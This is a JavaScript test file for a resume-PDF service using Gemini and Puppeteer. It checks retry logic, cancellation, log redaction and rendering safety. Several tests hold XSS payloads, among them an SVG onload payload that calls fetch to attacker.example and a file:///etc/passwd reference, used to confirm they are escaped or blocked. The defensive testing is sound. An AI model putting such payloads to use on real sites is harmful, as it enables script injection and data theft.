const { test, beforeEach } = require("node:test")
const assert = require("node:assert/strict")
const Module = require("node:module")
const path = require("node:path")
const { GoogleGenAI } = require("@google/genai")
const { setTimeout: delay } = require("node:timers/promises")

process.env.GOOGLE_GENAI_API_KEY = "pdf-generation-security-test-key"

const captured = {
    aiRequest: null,
    launchOptions: null,
    pageCalls: [],
    listeners: {},
    closeCount: 0,
    aiError: null,
    aiErrors: [],
    aiAttempts: 0,
    retryDelays: [],
    launchCount: 0,
    responseText: null,
    launchError: null,
    pdfError: null,
    setContentError: null,
    pendingPhase: null,
    phaseEntered: null,
    phaseRelease: null
}
let realProviderCall = null

let modelData = {
    fullName: "Candidate",
    contactDetails: ["candidate@example.test"],
    summary: "Experienced candidate",
    sections: [{ heading: "Experience", entries: [{ title: "Engineer", bullets: ["Built systems"] }] }]
}

class FakeGoogleGenAI {
    constructor() {
        this.models = {
            generateContent: async request => {
                captured.aiRequest = request
                captured.aiAttempts += 1
                if (realProviderCall) return realProviderCall(request)
                if (captured.aiErrors.length) throw captured.aiErrors.shift()
                if (captured.aiError) throw captured.aiError
                return { text: captured.responseText ?? JSON.stringify(modelData) }
            }
        }
    }
}

const fakePage = {
    async setContent(html, options) {
        captured.pageCalls.push({ method: "setContent", html, options })
        if (captured.setContentError) throw captured.setContentError
        await pausePhase("setContent")
    },
    async setJavaScriptEnabled(enabled) {
        captured.pageCalls.push({ method: "setJavaScriptEnabled", enabled })
        await pausePhase("setJavaScriptEnabled")
    },
    async setRequestInterception(enabled) {
        captured.pageCalls.push({ method: "setRequestInterception", enabled })
        await pausePhase("setRequestInterception")
    },
    on(event, handler) {
        captured.listeners[event] = handler
        captured.pageCalls.push({ method: "on", event })
    },
    async pdf(options) {
        captured.pageCalls.push({ method: "pdf", options })
        if (captured.pdfError) throw captured.pdfError
        await pausePhase("pdf")
        return Buffer.from("%PDF-test")
    }
}

const fakePuppeteer = {
    async launch(options) {
        captured.launchCount += 1
        captured.launchOptions = options
        if (captured.launchError) throw captured.launchError
        await pausePhase("launch")
        return {
            async newPage() {
                captured.pageCalls.push({ method: "newPage" })
                await pausePhase("newPage")
                return fakePage
            },
            async close() {
                captured.closeCount += 1
                await pausePhase("close")
            }
        }
    }
}

const servicePath = path.resolve(__dirname, "../src/services/ai.service.js")
const originalLoad = Module._load
Module._load = function (request, parent, isMain) {
    if (request === "@google/genai") return { GoogleGenAI: FakeGoogleGenAI }
    if (request === "puppeteer") return fakePuppeteer
    if (request === "node:timers/promises") return {
        setTimeout: async delay => { captured.retryDelays.push(delay) }
    }
    return originalLoad.call(this, request, parent, isMain)
}
delete require.cache[servicePath]
const { generateResumePdf } = require(servicePath)
Module._load = originalLoad

beforeEach(() => {
    realProviderCall = null
    captured.aiRequest = null
    captured.launchOptions = null
    captured.pageCalls = []
    captured.listeners = {}
    captured.closeCount = 0
    captured.aiError = null
    captured.aiErrors = []
    captured.aiAttempts = 0
    captured.retryDelays = []
    captured.launchCount = 0
    captured.responseText = null
    captured.launchError = null
    captured.pdfError = null
    captured.setContentError = null
    captured.pendingPhase = null
    captured.phaseEntered = null
    captured.phaseRelease = null
    modelData = {
        fullName: "Candidate",
        contactDetails: ["candidate@example.test"],
        summary: "Experienced candidate",
        sections: [{ heading: "Experience", entries: [{ title: "Engineer", bullets: ["Built systems"] }] }]
    }
})

async function generate(options = {}) {
    return generateResumePdf({ resume: "Resume evidence", selfDescription: "Profile", jobDescription: "Role", ...options })
}

function setContentCall() {
    return captured.pageCalls.find(call => call.method === "setContent")
}

function deferred() {
    let resolve
    const promise = new Promise(done => { resolve = done })
    return { promise, resolve }
}

async function pausePhase(phase) {
    if (captured.pendingPhase !== phase) return
    captured.phaseEntered.resolve()
    await captured.phaseRelease.promise
}

test("requests structured resume data and rejects the old raw-HTML response shape", async () => {
    modelData = { html: "<script>run()</script>" }

    await assert.rejects(generate(), /schema validation/i)
    assert.ok(captured.aiRequest.config.responseSchema.properties.fullName)
    assert.equal(captured.aiRequest.config.responseSchema.properties.html, undefined)
    assert.equal(setContentCall(), undefined)
})

test("omits maxItems only from the PDF provider schema while preserving its structure", async () => {
    await generate()

    const providerSchema = captured.aiRequest.config.responseSchema
    const keywords = []
    const visit = value => {
        if (!value || typeof value !== "object") return
        for (const [key, child] of Object.entries(value)) {
            keywords.push(key)
            visit(child)
        }
    }
    visit(providerSchema)

    assert.equal(keywords.includes("maxItems"), false)
    assert.equal(providerSchema.type, "object")
    assert.deepEqual(providerSchema.required, ["fullName", "contactDetails", "sections"])
    assert.equal(providerSchema.properties.sections.type, "array")
    assert.equal(providerSchema.properties.sections.items.properties.entries.items.properties.title.type, "string")
})

test("retains the original Zod array limits after provider constraints are omitted", async () => {
    modelData.contactDetails = Array.from({ length: 7 }, (_, index) => `contact-${index}`)

    await assert.rejects(generate(), error => error.stage === "schema_validation")
    assert.equal(captured.closeCount, 0)
})

test("wraps malformed Gemini JSON with the JSON parsing stage", async () => {
    captured.responseText = "{not json"

    await assert.rejects(generate(), error => error.stage === "json_parsing")
    assert.equal(captured.closeCount, 0)
})

test("returns a PDF after a valid Gemini response", async () => {
    const result = await generate()

    assert.deepEqual(result, Buffer.from("%PDF-test"))
    assert.equal(captured.closeCount, 1)
})

function providerError(status, code, details = []) {
    const error = new Error("Gemini request failed")
    if (status !== undefined) error.status = status
    error.error = { code: status, status: code, message: "Gemini temporarily unavailable", details }
    return error
}

function retryInfo(retryDelay) {
    return { "@type": "type.googleapis.com/google.rpc.RetryInfo", retryDelay }
}

function assertDelay(delay, minimum) {
    assert.ok(Number.isFinite(delay) && delay >= minimum && delay <= minimum + 250,
        `retry delay ${delay} must be between ${minimum} and ${minimum + 250}ms`)
}

for (const [label, error] of [
    ["HTTP 503", providerError(503, "UNAVAILABLE")],
    ["statusless UNAVAILABLE", providerError(undefined, "UNAVAILABLE")],
    ["SDK UNAVAILABLE code", Object.assign(new Error("Service unavailable"), { code: "UNAVAILABLE" })]
]) {
    test(`retries ${label} twice, then renders exactly one PDF`, async () => {
        captured.aiErrors = [error, error]

        assert.deepEqual(await generate(), Buffer.from("%PDF-test"))
        assert.equal(captured.aiAttempts, 3)
        assert.equal(captured.retryDelays.length, 2)
        assertDelay(captured.retryDelays[0], 1000)
        assertDelay(captured.retryDelays[1], 2000)
        assert.equal(captured.launchCount, 1)
        assert.equal(captured.pageCalls.filter(call => call.method === "pdf").length, 1)
        assert.equal(captured.closeCount, 1)
    })
}

test("stops after three transient failures and logs one sanitized diagnostic with attempt count", async () => {
    const error = providerError(503, "UNAVAILABLE")
    error.error.message = "Resume evidence; Profile; Bearer secret-token; candidate@example.test"
    captured.aiError = error
    const originalError = console.error
    const diagnostics = []
    console.error = (...args) => diagnostics.push(args)

    try {
        await assert.rejects(generate(), failure => {
            assert.equal(failure.stage, "gemini_request")
            assert.equal(failure.cause, error)
            assert.equal(failure.upstreamStatus, 503)
            return true
        })
    } finally {
        console.error = originalError
    }

    assert.equal(captured.aiAttempts, 3)
    assert.equal(captured.retryDelays.length, 2)
    assert.equal(captured.launchCount, 0)
    const failures = diagnostics.filter(([message]) => message === "Resume PDF generation failure")
    assert.equal(failures.length, 1)
    assert.equal(failures[0][1].attemptCount, 3)
    assert.equal(failures[0][1].httpStatus, 503)
    assert.doesNotMatch(JSON.stringify(failures), /Resume evidence|Profile|secret-token|candidate@example.test/)
})

for (const status of [400, 401, 403, 404]) {
    test(`does not retry HTTP ${status} even with a misleading UNAVAILABLE code`, async () => {
        captured.aiError = providerError(status, "UNAVAILABLE")

        await assert.rejects(generate(), error => error.stage === "gemini_request" && error.cause === captured.aiError)
        assert.equal(captured.aiAttempts, 1)
        assert.deepEqual(captured.retryDelays, [])
        assert.equal(captured.launchCount, 0)
    })
}

for (const code of ["INVALID_ARGUMENT", "FAILED_PRECONDITION", "UNAUTHENTICATED", "PERMISSION_DENIED", "NOT_FOUND"]) {
    test(`does not retry permanent provider code ${code}`, async () => {
        captured.aiError = providerError(undefined, code)
        await assert.rejects(generate(), error => error.cause === captured.aiError)
        assert.equal(captured.aiAttempts, 1)
    })
}

for (const status of [400, 429, 503]) {
    test(`handles real SDK HTTP ${status} without hidden retries or losing provider metadata`, async () => {
        const client = new GoogleGenAI({ apiKey: "sdk-boundary-test-key" })
        realProviderCall = request => client.models.generateContent(request)
        const originalFetch = globalThis.fetch
        const bodies = []
        const code = status === 503 ? "UNAVAILABLE" : status === 429 ? "RESOURCE_EXHAUSTED" : "INVALID_ARGUMENT"
        globalThis.fetch = async (url, init) => {
            bodies.push(JSON.parse(init.body))
            return new Response(JSON.stringify({ error: { code: status, status: code, message: "Provider request failed" } }), {
                status, headers: { "Content-Type": "application/json" }
            })
        }
        try {
            await assert.rejects(generate(), error => {
                assert.equal(error.upstreamStatus, status)
                assert.equal(error.providerCode, code)
                assert.equal(error.attemptCount, status === 503 ? 3 : 1)
                assert.equal(error.cause.status, status)
                return true
            })
            assert.equal(bodies.length, status === 503 ? 3 : 1)
            bodies.forEach(body => assert.deepEqual(body, bodies[0]))
            assert.equal(captured.launchCount, 0)
        } finally {
            globalThis.fetch = originalFetch
        }
    })
}

for (const [label, details, minimum] of [
    ["fractional seconds", [retryInfo("1.250s")], 1250],
    ["zero seconds", [retryInfo("0s")], 1000],
    ["maximum bounded delay", [retryInfo("30s")], 30_000],
    ["per-minute quota with retry guidance", [retryInfo("2s"), {
        "@type": "type.googleapis.com/google.rpc.QuotaFailure",
        violations: [{ quotaId: "GenerateRequestsPerMinutePerProjectPerModel", quotaValue: "20" }]
    }], 2000]
]) {
    test(`retries HTTP 429 with ${label} from RetryInfo`, async () => {
        captured.aiErrors = [providerError(429, "RESOURCE_EXHAUSTED", details)]

        assert.deepEqual(await generate(), Buffer.from("%PDF-test"))
        assert.equal(captured.aiAttempts, 2)
        assert.equal(captured.retryDelays.length, 1)
        assertDelay(captured.retryDelays[0], minimum)
        assert.equal(captured.launchCount, 1)
        assert.equal(captured.pageCalls.filter(call => call.method === "pdf").length, 1)
    })
}

for (const [label, details] of [
    ["no retry guidance", []],
    ["misleading UNAVAILABLE without guidance", []],
    ["malformed delay", [retryInfo("soon")]],
    ["numeric delay", [retryInfo(2)]],
    ["negative delay", [retryInfo("-1s")]],
    ["overlong delay", [retryInfo("30.001s")]],
    ["untyped guidance", [{ retryDelay: "1s" }]],
    ["daily quota violation", [retryInfo("1s"), {
        "@type": "type.googleapis.com/google.rpc.QuotaFailure",
        violations: [{ quotaId: "GenerateRequestsPerDayPerProjectPerModel" }]
    }]],
    ["zero quota violation", [retryInfo("1s"), {
        "@type": "type.googleapis.com/google.rpc.QuotaFailure",
        violations: [{ quotaId: "GenerateRequestsPerMinutePerProjectPerModel", quotaValue: "0" }]
    }]]
]) {
    test(`does not retry HTTP 429 with ${label}`, async () => {
        captured.aiError = providerError(429, label.startsWith("misleading") ? "UNAVAILABLE" : "RESOURCE_EXHAUSTED", details)

        await assert.rejects(generate(), error => error.stage === "gemini_request" && error.cause === captured.aiError)
        assert.equal(captured.aiAttempts, 1)
        assert.deepEqual(captured.retryDelays, [])
        assert.equal(captured.launchCount, 0)
    })
}

for (const [label, configure, stage, pdfCalls] of [
    ["malformed JSON", () => { captured.responseText = "{bad json" }, "json_parsing", 0],
    ["invalid resume schema", () => { modelData = { html: "invalid" } }, "schema_validation", 0],
    ["browser launch", () => { captured.launchError = providerError(503, "UNAVAILABLE") }, "puppeteer_launch", 0],
    ["page rendering", () => { captured.setContentError = providerError(503, "UNAVAILABLE") }, "pdf_rendering", 0],
    ["PDF rendering", () => { captured.pdfError = providerError(503, "UNAVAILABLE") }, "pdf_rendering", 1]
]) {
    test(`does not repeat Gemini or PDF work after ${label} fails`, async () => {
        configure()

        await assert.rejects(generate(), error => error.stage === stage)
        assert.equal(captured.aiAttempts, 1)
        assert.deepEqual(captured.retryDelays, [])
        assert.equal(captured.pageCalls.filter(call => call.method === "pdf").length, pdfCalls)
        assert.ok(captured.launchCount <= 1)
    })
}

for (const violation of [
    { description: "Daily Limit for read operations exceeded" },
    { description: "Service disabled" },
    { quotaId: "UnrecognizedQuota", quotaValue: "10" }
]) {
    test(`rejects permanent or unknown quota before PDF generation: ${JSON.stringify(violation)}`, async () => {
        captured.aiError = providerError(429, "RESOURCE_EXHAUSTED", [retryInfo("1s"), {
            "@type": "type.googleapis.com/google.rpc.QuotaFailure", violations: [violation]
        }])
        await assert.rejects(generate(), error => error.cause === captured.aiError)
        assert.equal(captured.aiAttempts, 1)
        assert.equal(captured.launchCount, 0)
    })
}

test("honors 503 timing guidance and grows consecutive guided delays", async () => {
    const error = providerError(503, "UNAVAILABLE", [retryInfo("10s")])
    captured.aiErrors = [error, error]
    await generate()
    assertDelay(captured.retryDelays[0], 10_000)
    assertDelay(captured.retryDelays[1], 20_000)
    assert.equal(captured.pageCalls.filter(call => call.method === "pdf").length, 1)
})

test("does not render a PDF after caller cancellation", async () => {
    const controller = new AbortController()
    controller.abort()
    await assert.rejects(generate({ signal: controller.signal }), error => error.stage === "gemini_request" && error.cause.name === "AbortError")
    assert.equal(captured.aiAttempts, 0)
    assert.equal(captured.launchCount, 0)
})

test("does not render a PDF when Gemini resolves after caller cancellation", async () => {
    const controller = new AbortController()
    realProviderCall = async () => {
        controller.abort()
        return { text: JSON.stringify(modelData) }
    }
    await assert.rejects(generate({ signal: controller.signal }), error => error.stage === "gemini_request" && error.cause.name === "AbortError")
    assert.equal(captured.aiAttempts, 1)
    assert.equal(captured.launchCount, 0)
})

for (const phase of ["launch", "newPage", "setJavaScriptEnabled", "setRequestInterception", "setContent", "pdf", "close"]) {
    test(`cancels pending Puppeteer ${phase}, closes the browser, and stops further PDF work`, async () => {
        const controller = new AbortController()
        const reason = Object.assign(new Error("PDF request cancelled"), { name: "AbortError" })
        captured.pendingPhase = phase
        captured.phaseEntered = deferred()
        captured.phaseRelease = deferred()
        const outcome = generate({ signal: controller.signal }).then(result => ({ result }), error => ({ error }))
        await captured.phaseEntered.promise
        const callsBeforeAbort = captured.pageCalls.length

        try {
            controller.abort(reason)
            const settled = await Promise.race([outcome, delay(150).then(() => null)])
            assert.ok(settled?.error, "cancellation must reject without waiting for the pending browser operation")
            assert.equal(settled.error.stage, phase === "launch" ? "puppeteer_launch" : phase === "close" ? "puppeteer_cleanup" : "pdf_rendering")
            assert.equal(settled.error.cause, reason)
            assert.equal(captured.closeCount, phase === "launch" ? 0 : 1)
            assert.equal(captured.pageCalls.length, callsBeforeAbort)
        } finally {
            captured.phaseRelease.resolve()
            await outcome
            await delay(0)
        }

        assert.equal(captured.closeCount, 1, "a late launch result must also be closed exactly once")
        assert.equal(captured.pageCalls.length, callsBeforeAbort, "late operation results must not resume the PDF workflow")
        assert.equal(captured.aiAttempts, 1)
    })
}

test("bounds a stalled Gemini call and prevents PDF rendering after the deadline", async () => {
    realProviderCall = () => new Promise(() => {})
    await assert.rejects(generate({ geminiTimeoutMs: 20 }), error => error.stage === "gemini_request" && error.upstreamStatus === 504 && error.cause.name === "TimeoutError")
    assert.equal(captured.aiAttempts, 1)
    assert.equal(captured.aiRequest.config.abortSignal.aborted, true)
    assert.ok(captured.aiRequest.config.httpOptions.timeout <= 20)
    assert.equal(captured.launchCount, 0)
})

test("logs safe Gemini provider metadata without prompt data", async () => {
    const privateResume = "Private resume contents"
    const syntheticKey = "AIza12345678901234567890"
    const providerBody = {
        error: {
            code: 400,
            message: `Invalid response schema for ${privateResume}; ${syntheticKey}; Bearer test-token; sample@example.test; +1 415 555 0132; ${"x".repeat(300)}`,
            status: "INVALID_ARGUMENT",
            details: [{ reason: `SCHEMA_INVALID ${privateResume}` }]
        }
    }
    captured.aiError = Object.assign(
        new Error(`got status: INVALID_ARGUMENT. ${JSON.stringify(providerBody)}`),
        { status: 400 }
    )
    const originalError = console.error
    const diagnostics = []
    console.error = (...args) => diagnostics.push(args)

    try {
        await assert.rejects(
            generateResumePdf({ resume: privateResume, selfDescription: "Private profile", jobDescription: "Private role", requestId: "request-123" }),
            error => error.stage === "gemini_request" && error.upstreamStatus === 400 && error.status === 400
        )
    } finally {
        console.error = originalError
    }

    const entry = diagnostics.find(([message]) => message === "Resume PDF generation failure")
    assert.ok(entry)
    assert.equal(entry[1].workflow, "resume_pdf")
    assert.equal(entry[1].failureStage, "gemini_request")
    assert.equal(entry[1].requestId, "request-123")
    assert.equal(entry[1].httpStatus, 400)
    assert.equal(entry[1].providerCode, "INVALID_ARGUMENT")
    assert.equal(entry[1].providerReason, "SCHEMA_INVALID [redacted]")
    assert.ok(entry[1].providerMessage.length <= 240)
    assert.doesNotMatch(entry[1].providerMessage, /Private resume contents|Private profile|Private role|AIza12345678901234567890|test-token|sample@example.test|415 555 0132/)
})

test("renders model output as structured text, not executable or attacker-controlled markup", async () => {
    modelData.fullName = '<script>window.pwned=true</script>'
    modelData.sections[0].entries[0].bullets = ['<img src=x onerror="window.pwned=true">']

    await generate()

    const rendered = setContentCall().html
    assert.doesNotMatch(rendered, /<script\b/i)
    assert.doesNotMatch(rendered, /<[a-z][^>]*\bon\w+\s*=/i)
    assert.doesNotMatch(rendered, /<img\b/i)
    assert.match(rendered, /&lt;script/i)
    assert.match(rendered, /&lt;img/i)
})

test("renders malicious URLs and SVG payloads as text, never as resource markup", async () => {
    modelData.contactDetails = ["https://attacker.example/pixel", "javascript:alert(1)"]
    modelData.sections[0].entries[0].bullets = ['<svg onload="fetch(\'https://attacker.example/x\')"><image href="file:///etc/passwd"></image></svg>']

    await generate()

    const rendered = setContentCall().html
    assert.doesNotMatch(rendered, /<svg\b|<image\b/i)
    assert.doesNotMatch(rendered, /<[a-z][^>]*\b(?:src|href)\s*=/i)
    assert.doesNotMatch(rendered, /<[a-z][^>]*\bon\w+\s*=/i)
    assert.match(rendered, /&lt;svg/i)
})

test("rejects oversized model output before opening a browser page", async () => {
    modelData.summary = "x".repeat(64 * 1024)

    await assert.rejects(generate(), /too large|size limit/i)
    assert.equal(captured.pageCalls.some(call => call.method === "setContent"), false)
})

test("uses a bounded document-loading timeout instead of waiting indefinitely for network idle", async () => {
    await generate()

    const options = setContentCall().options
    assert.ok(Number.isFinite(options?.timeout) && options.timeout > 0 && options.timeout <= 15_000)
    assert.notEqual(options?.waitUntil, "networkidle0")
    assert.ok(captured.launchOptions.timeout > 0 && captured.launchOptions.timeout <= 15_000)
})

test("disables JavaScript in the PDF page", async () => {
    await generate()

    assert.ok(captured.pageCalls.some(call => call.method === "setJavaScriptEnabled" && call.enabled === false))
    assert.match(setContentCall().html, /Content-Security-Policy" content="default-src 'none'/)
})

test("blocks browser network requests while generating the PDF", async () => {
    await generate()

    assert.ok(captured.pageCalls.some(call => call.method === "setRequestInterception" && call.enabled === true))
    assert.equal(typeof captured.listeners.request, "function")
    for (const url of ["https://attacker.example/pixel", "file:///etc/passwd"]) {
        let aborted = false
        await captured.listeners.request({
            url: () => url,
            abort: async () => { aborted = true },
            continue: async () => assert.fail("untrusted PDF request must not be continued")
        })
        assert.equal(aborted, true, `${url} must be blocked`)
    }
})

test("closes the browser when page setup fails", async () => {
    captured.setContentError = new Error("page setup failed")

    await assert.rejects(generate(), error => error.stage === "pdf_rendering")
    assert.equal(captured.closeCount, 1)
})

test("closes the browser when PDF rendering fails", async () => {
    captured.pdfError = new Error("pdf rendering failed")

    await assert.rejects(generate(), error => error.stage === "pdf_rendering")
    assert.equal(captured.closeCount, 1)
})

test("keeps Puppeteer launch failures distinct from Gemini request failures", async () => {
    captured.launchError = new Error("browser launch failed")

    await assert.rejects(generate(), error => error.stage === "puppeteer_launch")
    assert.equal(captured.closeCount, 0)
})

test("logs sanitized Puppeteer launch cause details and browser stderr", async () => {
    const privateResumeHtml = "<html><body>Private generated resume</body></html>"
    const launchError = Object.assign(new Error([
        "Failed to launch the browser process",
        "stderr:",
        "error while loading shared libraries: libexample.so",
        "Resume evidence",
        `Authorization: Bearer private-token-123`,
        "Cookie: session=private-cookie-456",
        `HTML=${privateResumeHtml}`,
        "AIza12345678901234567890",
        "diagnostic ".repeat(80)
    ].join("\n")), { code: "ERR_BROWSER_LAUNCH" })
    captured.launchError = launchError
    const originalError = console.error
    const diagnostics = []
    console.error = (...args) => diagnostics.push(args)

    let thrown
    try {
        await assert.rejects(generate(), error => {
            thrown = error
            return error.stage === "puppeteer_launch" && error.cause === launchError
        })
    } finally {
        console.error = originalError
    }

    const entry = diagnostics.find(([message]) => message === "Resume PDF generation failure")
    assert.ok(entry)
    assert.equal(entry[1].failureStage, "puppeteer_launch")
    assert.equal(entry[1].errorName, "ResumeAnalysisServiceError")
    assert.equal(entry[1].causeName, "Error")
    assert.equal(entry[1].causeCode, "ERR_BROWSER_LAUNCH")
    assert.ok(entry[1].causeMessage.length <= 500)
    assert.match(entry[1].causeMessage, /libexample\.so/)
    assert.ok(entry[1].browserStderr.length <= 500)
    assert.match(entry[1].browserStderr, /libexample\.so/)
    assert.equal(thrown.cause, launchError)
    assert.doesNotMatch(`${entry[1].causeMessage} ${entry[1].browserStderr}`, /Resume evidence|private-token-123|private-cookie-456|Private generated resume|AIza12345678901234567890/)
})

test("handles missing optional Puppeteer launch error fields safely", async () => {
    captured.launchError = {}
    const originalError = console.error
    const diagnostics = []
    console.error = (...args) => diagnostics.push(args)

    try {
        await assert.rejects(generate(), error => error.stage === "puppeteer_launch")
    } finally {
        console.error = originalError
    }

    const entry = diagnostics.find(([message]) => message === "Resume PDF generation failure")
    assert.ok(entry)
    assert.equal(entry[1].errorName, "ResumeAnalysisServiceError")
    assert.equal(entry[1].causeName, undefined)
    assert.equal(entry[1].causeCode, undefined)
    assert.equal(entry[1].causeMessage, undefined)
})

test("rejects oversized input before making a model request", async () => {
    await assert.rejects(generateResumePdf({ resume: "x".repeat(100_001), selfDescription: "", jobDescription: "" }), /size limit/i)
    assert.equal(captured.aiRequest, null)
    assert.equal(captured.closeCount, 0)
})
